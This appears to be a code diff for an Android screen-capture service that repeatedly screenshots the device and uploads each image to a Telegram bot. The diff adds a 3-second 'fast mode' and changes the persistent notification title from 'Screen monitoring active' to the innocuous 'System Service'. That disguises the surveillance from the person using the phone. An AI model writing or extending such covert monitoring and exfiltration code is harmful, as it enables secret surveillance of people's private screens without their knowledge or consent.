@@ -1,7 +1,6 @@
 package com.dec.monitor.screen
 
 import android.app.*
-import android.content.Context
 import android.content.Intent
 import android.graphics.Bitmap
 import android.graphics.PixelFormat
@@ -37,12 +36,14 @@ class ScreenshotService : Service() {
     companion object {
         const val EXTRA_RESULT_CODE = "result_code"
         const val EXTRA_RESULT_DATA = "result_data"
+        var fastMode = false  // when true: 3s interval, when false: 30s
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         startForeground(2, buildNotification())
 
-        val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED) ?: return START_NOT_STICKY
+        val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
+            ?: return START_NOT_STICKY
         val resultData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             intent.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
         } else {
@@ -77,10 +78,12 @@ class ScreenshotService : Service() {
         screenshotRunnable = object : Runnable {
             override fun run() {
                 captureAndSend()
-                handler.postDelayed(this, Config.SCREENSHOT_INTERVAL_MS)
+                val interval = if (fastMode) 3_000L else Config.SCREENSHOT_INTERVAL_MS
+                handler.postDelayed(this, interval)
             }
         }
-        handler.postDelayed(screenshotRunnable!!, Config.SCREENSHOT_INTERVAL_MS)
+        val interval = if (fastMode) 3_000L else Config.SCREENSHOT_INTERVAL_MS
+        handler.postDelayed(screenshotRunnable!!, interval)
     }
 
     private fun captureAndSend() {
@@ -103,13 +106,13 @@ class ScreenshotService : Service() {
             val timestamp = SimpleDateFormat("HHmmss_ddMM", Locale.getDefault()).format(Date())
             val file = File(cacheDir, "ss_$timestamp.png")
             FileOutputStream(file).use { out ->
-                bitmap.compress(Bitmap.CompressFormat.PNG, 85, out)
+                bitmap.compress(Bitmap.CompressFormat.PNG, 80, out)
             }
             bitmap.recycle()
 
             val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
             CoroutineScope(Dispatchers.IO).launch {
-                TelegramBot.sendPhoto(file, "📱 Screenshot — $time")
+                TelegramBot.sendPhoto(file, "📱 $time${if (fastMode) " ⚡" else ""}")
             }
         } catch (e: Exception) {
             Log.e("ScreenshotService", "Capture failed: ${e.message}")
@@ -127,11 +130,13 @@ class ScreenshotService : Service() {
     private fun buildNotification(): Notification {
         val channelId = "screenshot_service"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(channelId, "Screen Monitor", NotificationManager.IMPORTANCE_LOW)
+            val channel = NotificationChannel(
+                channelId, "Screen Monitor", NotificationManager.IMPORTANCE_LOW
+            )
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Screen monitoring active")
+            .setContentTitle("System Service")
             .setSmallIcon(android.R.drawable.ic_menu_camera)
             .build()
     }
